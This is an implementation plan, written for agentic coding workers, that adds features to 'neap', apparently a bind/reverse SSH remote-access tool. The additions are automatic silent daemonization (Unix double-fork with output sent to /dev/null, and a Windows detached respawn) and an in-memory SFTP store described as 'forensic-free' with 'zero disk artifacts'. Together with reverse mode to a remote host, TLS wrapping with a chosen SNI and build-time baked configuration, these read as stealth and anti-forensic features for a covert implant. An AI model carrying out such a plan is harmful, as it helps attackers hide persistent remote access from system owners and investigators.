# Process Daemonization & In-Memory SFTP Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add automatic process daemonization (Unix double-fork, Windows detached respawn) and an optional in-memory SFTP filesystem (`--memfs`) that stores files in RAM with zero disk artifacts.

**Architecture:** Daemonization runs before the tokio runtime in a synchronous `main()`. The in-memory SFTP is a parallel implementation of the `russh_sftp::server::Handler` trait backed by `HashMap` instead of `tokio::fs`, activated by a flag that flows through `Params` → `NeapServer` → `NeapHandler`.

**Tech Stack:** Rust, nix (Unix daemonization), windows-sys (Windows detach), russh-sftp 2.x (Handler trait), tokio::sync::RwLock (shared memfs state)

**Spec:** `docs/specs/2026-04-06-daemon-memfs-design.md`

---

## File Map

| File | Action | Responsibility |
|------|--------|---------------|
| `src/daemon.rs` | Create | Unix double-fork and Windows detached respawn |
| `src/memfs.rs` | Create | In-memory filesystem: `MemFs`, `MemMetadata`, path operations |
| `src/memsftp.rs` | Create | SFTP handler backed by `MemFs` |
| `src/main.rs` | Modify | Add `mod daemon/memfs/memsftp`, split main for daemonization, add `--memfs` flag, add `memfs` to `Params` |
| `src/config.rs` | Modify | Add `MEMFS` constant |
| `src/server.rs` | Modify | Add `memfs` fields, conditional SFTP handler creation |
| `src/transport.rs` | Modify | Create shared `MemFs` instance, pass to server |
| `src/lib.rs` | Modify | Add `pub mod memfs;` for test access |
| `build.rs` | Modify | Add `NEAP_MEMFS` env var |
| `tests/integration.rs` | Modify | Add MemFs unit tests |

---

## Task 1: Process Daemonization

**Files:**
- Create: `src/daemon.rs`
- Modify: `src/main.rs`

- [ ] **Step 1: Create `src/daemon.rs` with Unix double-fork**

```rust
//! Process daemonization — detach from terminal and run in background.
//!
//! Unix: classic double-fork pattern.
//! Windows: re-launch self as detached process.

/// Daemonize the current process. The parent exits; only the
/// backgrounded child returns from this function.
#[cfg(unix)]
pub fn daemonize() {
    use nix::unistd::{fork, setsid, ForkResult};
    use std::os::unix::io::RawFd;

    // First fork �� parent exits, child continues
    // SAFETY: fork() is called before any multi-threaded runtime.
    // The child will not touch shared state before exec/setsid.
    match unsafe { fork() } {
        Ok(ForkResult::Parent { .. }) => std::process::exit(0),
        Ok(ForkResult::Child) => {}
        Err(e) => {
            eprintln!("neap: first fork failed: {}", e);
            std::process::exit(1);
        }
    }

    // New session — become session leader, detach from terminal
    if let Err(e) = setsid() {
        eprintln!("neap: setsid failed: {}", e);
        std::process::exit(1);
    }

    // Second fork — prevent reacquiring a controlling terminal
    // SAFETY: Same as above — single-threaded, no shared state.
    match unsafe { fork() } {
        Ok(ForkResult::Parent { .. }) => std::process::exit(0),
        Ok(ForkResult::Child) => {}
        Err(e) => {
            eprintln!("neap: second fork failed: {}", e);
            std::process::exit(1);
        }
    }

    // Change working directory to root to release any dir locks
    let _ = std::env::set_current_dir("/");

    // Redirect stdin/stdout/stderr to /dev/null
    // SAFETY: /dev/null is a valid path, dup2 on valid fds is safe.
    unsafe {
        let devnull = libc::open(b"/dev/null\0".as_ptr() as *const _, libc::O_RDWR);
        if devnull >= 0 {
            libc::dup2(devnull, 0);
            libc::dup2(devnull, 1);
            libc::dup2(devnull, 2);
            if devnull > 2 {
                libc::close(devnull);
            }
        }
    }
}

/// Daemonize on Windows by re-launching as a detached process.
/// If already detached (no console window), proceed normally.
#[cfg(windows)]
pub fn daemonize() {
    use std::ptr;
    use windows_sys::Win32::System::Console::GetConsoleWindow;
    use windows_sys::Win32::System::Threading::{
        CreateProcessW, DETACHED_PROCESS, CREATE_NO_WINDOW,
        PROCESS_INFORMATION, STARTUPINFOW,
    };

    // SAFETY: GetConsoleWindow returns NULL if no console is attached.
    let hwnd = unsafe { GetConsoleWindow() };
    if hwnd.is_null() {
        // Already detached — we are the background child. Proceed.
        return;
    }

    // Re-launch ourselves with no console
    let exe = std::env::current_exe().expect("cannot determine own executable path");
    let args: Vec<String> = std::env::args().collect();
    let cmd_line: String = args
        .iter()
        .map(|a| {
            if a.contains(' ') {
                format!("\"{}\"", a)
            } else {
                a.clone()
            }
        })
        .collect::<Vec<_>>()
        .join(" ");
    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();

    // SAFETY: All pointers are valid. STARTUPINFOW is zeroed.
    // CREATE_NO_WINDOW | DETACHED_PROCESS ensures no console.
    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let ok = CreateProcessW(
            ptr::null(),
            cmd_wide.as_mut_ptr(),
            ptr::null(),
            ptr::null(),
            0,
            CREATE_NO_WINDOW | DETACHED_PROCESS,
            ptr::null(),
            ptr::null(),
            &si,
            &mut pi,
        );

        if ok != 0 {
            // Successfully launched detached child — parent exits
            std::process::exit(0);
        } else {
            // Failed to re-launch — continue in foreground (degraded)
            eprintln!("neap: failed to daemonize, continuing in foreground");
        }
    }
}
```

- [ ] **Step 2: Modify `src/main.rs` — split main, add daemon module**

Add `mod daemon;` to the module list. Split `#[tokio::main] async fn main()` into a synchronous `fn main()` that calls `daemon::daemonize()` first:

Replace lines 121-165 of main.rs with:

```rust
mod daemon;

// ... (existing mod declarations stay at top) ...

fn main() {
    // Daemonize before starting async runtime
    daemon::daemonize();

    // Start the async runtime
    tokio_main();
}

#[tokio::main]
async fn tokio_main() {
    let params = match parse_params() {
        Ok(p) => p,
        Err(e) => {
            eprintln!("neap: {}", e);
            std::process::exit(1);
        }
    };

    let level = if params.verbose {
        log::LevelFilter::Info
    } else {
        log::LevelFilter::Off
    };
    let _ = env_logger::builder().filter_level(level).try_init();

    log::info!("neap v{}", config::VERSION);

    let mode = if params.listen || params.lhost.is_empty() {
        "bind"
    } else {
        "reverse"
    };
    log::info!("Mode: {}", mode);
    log::info!("Port: {}", params.lport);

    if mode == "reverse" {
        log::info!("Target: {}@{}", params.luser, params.lhost);
        log::info!("Bind port: {}", params.bind_port);
    }

    if params.tls_wrap {
        log::info!("TLS: enabled (SNI: {})", params.tls_sni);
    } else {
        log::info!("TLS: disabled");
    }

    if let Err(e) = transport::run(&params).await {
        log::error!("Fatal: {}", e);
        std::process::exit(1);
    }
}
```

Note: after daemonization on Unix, stderr is /dev/null, so `eprintln!` in the error handler should become `log::error!` which also goes nowhere — but that's correct (silent process).

- [ ] **Step 3: Verify it compiles**

Run: `cargo build`
Expected: Compiles successfully.

- [ ] **Step 4: Commit**

```bash
git add src/daemon.rs src/main.rs
git commit -m "feat: automatic process daemonization (Unix double-fork, Windows detach)"
```

---

## Task 2: MemFs — In-Memory Filesystem

**Files:**
- Create: `src/memfs.rs`
- Modify: `src/lib.rs`

- [ ] **Step 1: Create `src/memfs.rs`**

```rust
//! In-memory virtual filesystem for forensic-free SFTP operations.
//!
//! All files live in RAM. Nothing touches disk. Data is lost on exit.

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::SystemTime;

use tokio::sync::RwLock;

/// Metadata for an in-memory file or directory.
#[derive(Debug, Clone)]
pub struct MemMetadata {
    /// File size in bytes (0 for directories).
    pub size: u64,
    /// Unix-style permission bits.
    pub permissions: u32,
    /// Last modification time.
    pub modified: SystemTime,
    /// Whether this is a directory.
    pub is_dir: bool,
}

/// In-memory virtual filesystem.
///
/// Files are stored as `PathBuf -> Vec<u8>`. Directories are tracked
/// in a separate `HashSet`. Wrapped in `Arc<RwLock>` for concurrent
/// access across SSH sessions.
#[derive(Debug)]
pub struct MemFs {
    files: HashMap<PathBuf, Vec<u8>>,
    dirs: HashSet<PathBuf>,
    metadata: HashMap<PathBuf, MemMetadata>,
}

impl MemFs {
    /// Create a new empty filesystem with only the root directory.
    pub fn new() -> Self {
        let root = if cfg!(windows) {
            PathBuf::from("C:\\")
        } else {
            PathBuf::from("/")
        };
        let mut dirs = HashSet::new();
        dirs.insert(root.clone());
        let mut metadata = HashMap::new();
        metadata.insert(
            root,
            MemMetadata {
                size: 0,
                permissions: 0o755,
                modified: SystemTime::now(),
                is_dir: true,
            },
        );
        Self {
            files: HashMap::new(),
            dirs,
            metadata,
        }
    }

    /// Normalize a path — resolve `.` and `..`, ensure absolute.
    pub fn normalize(path: &Path) -> PathBuf {
        let mut components = Vec::new();
        for comp in path.components() {
            match comp {
                std::path::Component::ParentDir => {
                    components.pop();
                }
                std::path::Component::CurDir => {}
                other => components.push(other),
            }
        }
        if components.is_empty() {
            if cfg!(windows) {
                PathBuf::from("C:\\")
            } else {
                PathBuf::from("/")
            }
        } else {
            components.iter().collect()
        }
    }

    /// Check if a path exists (file or directory).
    pub fn exists(&self, path: &Path) -> bool {
        let p = Self::normalize(path);
        self.files.contains_key(&p) || self.dirs.contains(&p)
    }

    /// Check if a path is a directory.
    pub fn is_dir(&self, path: &Path) -> bool {
        self.dirs.contains(&Self::normalize(path))
    }

    /// Get metadata for a path.
    pub fn stat(&self, path: &Path) -> Option<MemMetadata> {
        self.metadata.get(&Self::normalize(path)).cloned()
    }

    /// Create or overwrite a file.
    pub fn create_file(&mut self, path: &Path, data: Vec<u8>) {
        let p = Self::normalize(path);
        let size = data.len() as u64;
        self.files.insert(p.clone(), data);
        self.metadata.insert(
            p,
            MemMetadata {
                size,
                permissions: 0o644,
                modified: SystemTime::now(),
                is_dir: false,
            },
        );
    }

    /// Read file contents.
    pub fn read_file(&self, path: &Path) -> Option<&Vec<u8>> {
        self.files.get(&Self::normalize(path))
    }

    /// Write data at an offset, extending the file if needed.
    pub fn write_at(&mut self, path: &Path, offset: u64, data: &[u8]) -> bool {
        let p = Self::normalize(path);
        if let Some(contents) = self.files.get_mut(&p) {
            let offset = offset as usize;
            let needed = offset + data.len();
            if contents.len() < needed {
                contents.resize(needed, 0);
            }
            contents[offset..offset + data.len()].copy_from_slice(data);
            if let Some(meta) = self.metadata.get_mut(&p) {
                meta.size = contents.len() as u64;
                meta.modified = SystemTime::now();
            }
            true
        } else {
            false
        }
    }

    /// Read data at an offset.
    pub fn read_at(&self, path: &Path, offset: u64, len: u32) -> Option<Vec<u8>> {
        let p = Self::normalize(path);
        self.files.get(&p).map(|contents| {
            let start = (offset as usize).min(contents.len());
            let end = (start + len as usize).min(contents.len());
            contents[start..end].to_vec()
        })
    }

    /// Create a directory.
    pub fn mkdir(&mut self, path: &Path) -> bool {
        let p = Self::normalize(path);
        if self.exists(&p) {
            return false;
        }
        self.dirs.insert(p.clone());
        self.metadata.insert(
            p,
            MemMetadata {
                size: 0,
                permissions: 0o755,
                modified: SystemTime::now(),
                is_dir: true,
            },
        );
        true
    }

    /// Remove a file.
    pub fn remove_file(&mut self, path: &Path) -> bool {
        let p = Self::normalize(path);
        self.files.remove(&p).is_some() && self.metadata.remove(&p).is_some()
    }

    /// Remove an empty directory.
    pub fn remove_dir(&mut self, path: &Path) -> bool {
        let p = Self::normalize(path);
        // Check it's empty — no files or subdirs with this prefix
        let has_children = self.files.keys().any(|k| k.starts_with(&p) && k != &p)
            || self.dirs.iter().any(|d| d.starts_with(&p) && d != &p);
        if has_children {
            return false;
        }
        self.dirs.remove(&p) && self.metadata.remove(&p).is_some()
    }

    /// Rename a file or directory.
    pub fn rename(&mut self, from: &Path, to: &Path) -> bool {
        let f = Self::normalize(from);
        let t = Self::normalize(to);
        if let Some(data) = self.files.remove(&f) {
            self.files.insert(t.clone(), data);
            if let Some(meta) = self.metadata.remove(&f) {
                self.metadata.insert(t, meta);
            }
            true
        } else if self.dirs.remove(&f) {
            self.dirs.insert(t.clone());
            if let Some(meta) = self.metadata.remove(&f) {
                self.metadata.insert(t, meta);
            }
            true
        } else {
            false
        }
    }

    /// List entries in a directory (file names only, not full paths).
    pub fn list_dir(&self, path: &Path) -> Vec<(String, MemMetadata)> {
        let p = Self::normalize(path);
        let mut entries = Vec::new();

        for (file_path, _) in &self.files {
            if let Some(parent) = file_path.parent() {
                if Self::normalize(parent) == p {
                    if let Some(name) = file_path.file_name() {
                        if let Some(meta) = self.metadata.get(file_path) {
                            entries.push((name.to_string_lossy().to_string(), meta.clone()));
                        }
                    }
                }
            }
        }

        for dir_path in &self.dirs {
            if let Some(parent) = dir_path.parent() {
                if Self::normalize(parent) == p && dir_path != &p {
                    if let Some(name) = dir_path.file_name() {
                        if let Some(meta) = self.metadata.get(dir_path) {
                            entries.push((name.to_string_lossy().to_string(), meta.clone()));
                        }
                    }
                }
            }
        }

        entries
    }

    /// Set permissions on a path.
    pub fn set_permissions(&mut self, path: &Path, perms: u32) -> bool {
        let p = Self::normalize(path);
        if let Some(meta) = self.metadata.get_mut(&p) {
            meta.permissions = perms;
            true
        } else {
            false
        }
    }
}

/// Thread-safe shared reference to the in-memory filesystem.
pub type SharedMemFs = Arc<RwLock<MemFs>>;

/// Create a new shared in-memory filesystem.
pub fn new_shared() -> SharedMemFs {
    Arc::new(RwLock::new(MemFs::new()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_create_and_read_file() {
        let mut fs = MemFs::new();
        fs.create_file(Path::new("/test.txt"), b"hello world".to_vec());
        assert_eq!(fs.read_file(Path::new("/test.txt")), Some(&b"hello world".to_vec()));
    }

    #[test]
    fn test_write_at_extends_file() {
        let mut fs = MemFs::new();
        fs.create_file(Path::new("/f"), vec![0; 10]);
        fs.write_at(Path::new("/f"), 5, b"ABCDE");
        let data = fs.read_file(Path::new("/f")).unwrap();
        assert_eq!(data.len(), 10);
        assert_eq!(&data[5..10], b"ABCDE");
    }

    #[test]
    fn test_write_at_beyond_end() {
        let mut fs = MemFs::new();
        fs.create_file(Path::new("/f"), vec![1, 2, 3]);
        fs.write_at(Path::new("/f"), 10, b"XY");
        let data = fs.read_file(Path::new("/f")).unwrap();
        assert_eq!(data.len(), 12);
        assert_eq!(&data[10..12], b"XY");
        assert_eq!(data[3], 0); // zero-padded gap
    }

    #[test]
    fn test_read_at() {
        let mut fs = MemFs::new();
        fs.create_file(Path::new("/f"), b"abcdefghij".to_vec());
        assert_eq!(fs.read_at(Path::new("/f"), 3, 4), Some(b"defg".to_vec()));
    }

    #[test]
    fn test_mkdir_and_list() {
        let mut fs = MemFs::new();
        assert!(fs.mkdir(Path::new("/subdir")));
        fs.create_file(Path::new("/subdir/a.txt"), b"aaa".to_vec());
        fs.create_file(Path::new("/subdir/b.txt"), b"bbb".to_vec());
        let entries = fs.list_dir(Path::new("/subdir"));
        let names: Vec<String> = entries.iter().map(|(n, _)| n.clone()).collect();
        assert!(names.contains(&"a.txt".to_string()));
        assert!(names.contains(&"b.txt".to_string()));
        assert_eq!(names.len(), 2);
    }

    #[test]
    fn test_remove_file() {
        let mut fs = MemFs::new();
        fs.create_file(Path::new("/f"), b"data".to_vec());
        assert!(fs.remove_file(Path::new("/f")));
        assert!(!fs.exists(Path::new("/f")));
    }

    #[test]
    fn test_remove_nonempty_dir_fails() {
        let mut fs = MemFs::new();
        fs.mkdir(Path::new("/dir"));
        fs.create_file(Path::new("/dir/f"), b"data".to_vec());
        assert!(!fs.remove_dir(Path::new("/dir")));
        assert!(fs.is_dir(Path::new("/dir")));
    }

    #[test]
    fn test_rename_file() {
        let mut fs = MemFs::new();
        fs.create_file(Path::new("/old"), b"data".to_vec());
        assert!(fs.rename(Path::new("/old"), Path::new("/new")));
        assert!(!fs.exists(Path::new("/old")));
        assert_eq!(fs.read_file(Path::new("/new")), Some(&b"data".to_vec()));
    }

    #[test]
    fn test_normalize() {
        assert_eq!(MemFs::normalize(Path::new("/a/b/../c")), PathBuf::from("/a/c"));
        assert_eq!(MemFs::normalize(Path::new("/a/./b")), PathBuf::from("/a/b"));
    }

    #[test]
    fn test_stat_metadata() {
        let mut fs = MemFs::new();
        fs.create_file(Path::new("/f"), b"hello".to_vec());
        let meta = fs.stat(Path::new("/f")).unwrap();
        assert_eq!(meta.size, 5);
        assert_eq!(meta.permissions, 0o644);
        assert!(!meta.is_dir);
    }
}
```

- [ ] **Step 2: Add `pub mod memfs;` to `src/lib.rs`**

```rust
pub mod config;
pub mod error;
pub mod info;
pub mod memfs;
```

- [ ] **Step 3: Verify it compiles and tests pass**

Run: `cargo build && cargo test`
Expected: Compiles. All existing tests plus 10 new memfs tests pass.

- [ ] **Step 4: Commit**

```bash
git add src/memfs.rs src/lib.rs
git commit -m "feat: in-memory filesystem (MemFs) with unit tests"
```

---

## Task 3: MemSftpHandler — In-Memory SFTP

**Files:**
- Create: `src/memsftp.rs`
- Modify: `src/main.rs` (add `mod memsftp;`)

- [ ] **Step 1: Create `src/memsftp.rs`**

Implement `russh_sftp::server::Handler` backed by `MemFs`. Follow the same structure as `src/sftp.rs` but use `MemFs` operations instead of `tokio::fs`.

Key differences from `sftp.rs`:
- Constructor takes `SharedMemFs` (the `Arc<RwLock<MemFs>>`)
- File handles map to `PathBuf` + `u64` cursor position (not `tokio::fs::File`)
- All operations acquire read or write lock on the `MemFs`
- `realpath` uses `MemFs::normalize()` instead of `tokio::fs::canonicalize`
- `stat`/`lstat` return `MemMetadata` converted to SFTP `FileAttributes`

The handler must implement the same trait methods as `sftp.rs`: `init`, `open`, `close`, `read`, `write`, `stat`, `lstat`, `fstat`, `opendir`, `readdir`, `mkdir`, `rmdir`, `remove`, `rename`, `realpath`, `setstat`, `fsetstat`.

**CRITICAL:** Check the actual `russh_sftp::server::Handler` trait by reading `src/sftp.rs` for the exact method signatures. The memsftp handler must match them exactly.

- [ ] **Step 2: Add `mod memsftp;` to `src/main.rs`**

- [ ] **Step 3: Verify it compiles**

Run: `cargo build`

- [ ] **Step 4: Commit**

```bash
git add src/memsftp.rs src/main.rs
git commit -m "feat: in-memory SFTP handler (MemSftpHandler)"
```

---

## Task 4: Wire Everything Together

**Files:**
- Modify: `src/config.rs` — add `MEMFS` constant
- Modify: `build.rs` — add `NEAP_MEMFS` env var
- Modify: `src/main.rs` — add `memfs` to `Params`, add `--memfs` CLI flag
- Modify: `src/server.rs` — add `memfs` field, conditional SFTP handler
- Modify: `src/transport.rs` — create shared MemFs, pass to server

- [ ] **Step 1: Add NEAP_MEMFS to build.rs**

Add `("NEAP_MEMFS", "")` to the vars array in `build.rs`.

- [ ] **Step 2: Add MEMFS constant to config.rs**

Add to `src/config.rs`:
```rust
/// When non-empty, enables in-memory SFTP (no disk artifacts).
#[allow(dead_code)]
pub const MEMFS: &str = env!("NEAP_MEMFS");
```

- [ ] **Step 3: Add `memfs` to Params and CLI**

In `src/main.rs`, add `pub memfs: bool` to the `Params` struct.

In the CLI `parse_params()`, add a `--memfs` flag:
```rust
/// Use in-memory filesystem for SFTP (no disk artifacts)
#[arg(long = "memfs")]
memfs: bool,
```

And include in the Ok(Params { ... }):
```rust
memfs: cli.memfs || !config::MEMFS.is_empty(),
```

In the NOCLI `parse_params()`:
```rust
memfs: !config::MEMFS.is_empty(),
```

- [ ] **Step 4: Add memfs fields to NeapServer and NeapHandler**

In `src/server.rs`, add to `NeapServer`:
```rust
pub memfs: bool,
pub shared_memfs: Option<crate::memfs::SharedMemFs>,
```

Add to `NeapHandler`:
```rust
pub memfs: bool,
pub shared_memfs: Option<crate::memfs::SharedMemFs>,
```

Pass them through in `new_client()`.

- [ ] **Step 5: Conditional SFTP handler in subsystem_request**

In `src/server.rs`, update `subsystem_request` to check `self.memfs`:

```rust
if name == "sftp" {
    if let Some(ch) = self.channels.remove(&channel_id) {
        if self.memfs {
            if let Some(ref memfs) = self.shared_memfs {
                let handler = crate::memsftp::MemSftpHandler::new(memfs.clone());
                tokio::spawn(async move {
                    russh_sftp::server::run(ch.into_stream(), handler).await;
                });
            }
        } else {
            let handler = crate::sftp::SftpHandler::new();
            tokio::spawn(async move {
                russh_sftp::server::run(ch.into_stream(), handler).await;
            });
        }
        session.channel_success(channel_id)?;
    }
}
```

- [ ] **Step 6: Create shared MemFs in transport.rs**

In `src/transport.rs`, in the `run()` function, create the shared memfs if enabled:

```rust
let shared_memfs = if params.memfs {
    log::info!("In-memory SFTP enabled (no disk artifacts)");
    Some(crate::memfs::new_shared())
} else {
    None
};
```

Pass `memfs` and `shared_memfs` when constructing `NeapServer`.

- [ ] **Step 7: Add --memfs to build.sh**

Add `MEMFS=false` to defaults, `--memfs` to argument parsing that sets `MEMFS=true`, and when `MEMFS=true`, export `NEAP_MEMFS=1` before cargo build.

- [ ] **Step 8: Verify it compiles and all tests pass**

Run: `cargo build && cargo test`
Expected: Compiles. All tests pass (existing + memfs unit tests).

- [ ] **Step 9: Commit**

```bash
git add build.rs src/config.rs src/main.rs src/server.rs src/transport.rs build.sh
git commit -m "feat: wire memfs flag through config, CLI, server, and transport"
```

---

## Task 5: Integration Tests & Documentation

**Files:**
- Modify: `tests/integration.rs`
- Modify: `README.md`
- Modify: `CHANGELOG.md`

- [ ] **Step 1: Add MemFs integration tests**

Add to `tests/integration.rs`:

```rust
#[test]
fn test_memfs_create_read_write() {
    use std::path::Path;
    let mut fs = neap::memfs::MemFs::new();
    fs.create_file(Path::new("/test"), b"hello".to_vec());
    assert_eq!(fs.read_at(Path::new("/test"), 0, 5), Some(b"hello".to_vec()));
    fs.write_at(Path::new("/test"), 5, b" world");
    assert_eq!(
        fs.read_at(Path::new("/test"), 0, 11),
        Some(b"hello world".to_vec())
    );
}

#[test]
fn test_memfs_directory_operations() {
    use std::path::Path;
    let mut fs = neap::memfs::MemFs::new();
    assert!(fs.mkdir(Path::new("/data")));
    assert!(fs.is_dir(Path::new("/data")));
    fs.create_file(Path::new("/data/file.bin"), vec![0xDE, 0xAD]);
    assert!(!fs.remove_dir(Path::new("/data"))); // not empty
    assert!(fs.remove_file(Path::new("/data/file.bin")));
    assert!(fs.remove_dir(Path::new("/data")));
    assert!(!fs.exists(Path::new("/data")));
}

#[test]
fn test_memfs_rename() {
    use std::path::Path;
    let mut fs = neap::memfs::MemFs::new();
    fs.create_file(Path::new("/src"), b"payload".to_vec());
    assert!(fs.rename(Path::new("/src"), Path::new("/dst")));
    assert!(!fs.exists(Path::new("/src")));
    assert_eq!(fs.read_file(Path::new("/dst")), Some(&b"payload".to_vec()));
}
```

- [ ] **Step 2: Update README.md**

Add to the Features section:
```
- Automatic process daemonization (silent background operation)
- In-memory SFTP (`--memfs`) — RAM-only file storage, zero disk artifacts
```

Add to the Usage section:
```bash
# In-memory SFTP (no files touch disk)
neap --memfs -l -p 4444
```

- [ ] **Step 3: Update CHANGELOG.md**

Add under `## [1.0.0]` → `### Added`:
```
- Automatic process daemonization (Unix double-fork, Windows detached respawn)
- In-memory SFTP mode (`--memfs` / `NEAP_MEMFS`) — files stored in RAM only
```

- [ ] **Step 4: Run all tests**

Run: `cargo test`
Expected: All tests pass — existing + 10 memfs unit tests + 3 memfs integration tests.

- [ ] **Step 5: Commit**

```bash
git add tests/integration.rs README.md CHANGELOG.md
git commit -m "test: memfs integration tests, update docs for new features"
```

---

## Summary

| Task | Component | Key Files |
|------|-----------|-----------|
| 1 | Process Daemonization | `src/daemon.rs`, `src/main.rs` |
| 2 | MemFs Filesystem | `src/memfs.rs`, `src/lib.rs` |
| 3 | MemSftpHandler | `src/memsftp.rs`, `src/main.rs` |
| 4 | Wiring | `build.rs`, `config.rs`, `main.rs`, `server.rs`, `transport.rs`, `build.sh` |
| 5 | Tests & Docs | `tests/integration.rs`, `README.md`, `CHANGELOG.md` |
